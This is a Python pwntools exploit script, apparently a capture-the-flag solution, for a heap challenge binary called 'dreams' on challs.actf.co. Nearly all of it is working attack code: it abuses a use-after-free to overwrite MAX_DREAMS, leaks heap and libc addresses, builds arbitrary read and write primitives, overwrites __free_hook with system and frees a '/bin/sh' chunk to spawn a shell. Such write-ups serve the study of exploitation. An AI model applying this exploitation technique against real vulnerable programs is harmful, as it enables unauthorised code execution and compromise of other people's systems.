#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host challs.actf.co --port 31227 dreams
from pwn import *
# Set up pwntools for the correct architecture
elf = context.binary = ELF('dreams')
libc = ELF('libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'challs.actf.co'
port = int(args.PORT or 31227)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([elf.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([elf.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#b gosleep
#b sell
#b psychiatrist
continue
'''.format(**locals())


def malloc(i, data=65, data2=b'A'):
    '''Malloc 28 bytes'''
    if type(data) == int:
        log.info('Malloc [%d] = 0x%X %s', i, data, data2)
        data = p64(data)
    else:
        log.debug('Malloc [%d] = %s %s', i, str(data), data2)
    try:
        io.sendline(b'1')
        io.sendlineafter(b'dream? ', str(i).encode())
        io.sendafter(b'))? ', data)
        io.sendlineafter(b'about? ', data2)
        log.debug(io.readuntil(b'> ').decode())
    except:
        log.error(io.read().decode())

def free(i, wait=True):
    '''Free 28 bytes'''
    log.info('Free [%d]', i)
    try:
        io.sendline(b'2')
        io.sendlineafter(b'in? ', str(i).encode())
        if wait:
            log.debug(io.readuntil(b'> ').decode())
    except:
        log.error(io.read().decode())


def edit(i, data):
    '''Edit 8 bytes'''
    if type(data) == int:
        log.info('Edit [%d] = 0x%X', i, data)
        data = p64(data)
    else:
        log.info('Edit [%d] = %s', i, str(data))
    try:
        io.sendline(b'3')
        io.sendlineafter(b'trouble? ', str(i).encode())
        response = io.sendafter(b'date: ', data)
        value = u64(response[59:response.find(b'\nDue')].ljust(8, b'\x00'))
        log.debug(io.readuntil(b'> ').decode())
        return value
    except:
        log.error(io.read().decode())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

#log.setLevel('DEBUG')
log.info('Starting')

def uaf(address, index):
    malloc(index)
    malloc(index+1)
    free(index)
    free(index+1)
    return edit(index+1, address-8)

def _write(address, data, index):
    value = uaf(address, index)
    malloc(index+2)
    malloc(index+3, b'\n', data)
    return value


address_of_index = lambda index: heap + 0x2a0 + 8*index

def init_awr():
    address = address_of_index(13)
    _write(address, b'A', 10)
    malloc(14)
    log.success('Arbitrary read write init done')
    return 12, 13

def write(address, data):
    edit(editing_index, address)
    edit(writing_index, data)
    #log.info('0x%X written in 0x%X', data, address)


def read(address):
    edit(editing_index, address-8)
    return edit(writing_index, b'A')


value = _write(elf.sym.MAX_DREAMS, b'YYYY', 0)
log.success('MAX_DREAMS overwrited')
heap = value & 0xFFFF000
if not heap:
    log.error('Heap base address leak failed')
log.success('Heap base address leaked: 0x%X', heap)

writing_index, editing_index = init_awr()
# write(heap+0x3c0, b'ABC')
# write(heap+0x3c8, b'DEF')

leak = read(elf.symbols['stdout@@GLIBC_2.2.5'])
if not leak:
    log.error('Libc address leak failed')
libc.address = leak - libc.symbols['_IO_2_1_stdout_']
log.success('Libc base address leakded: 0x%X', libc.address)

write(libc.symbols['__free_hook'], libc.symbols.system)
malloc(15, b'/bin/sh')
free(15, wait=False)

io.interactive()

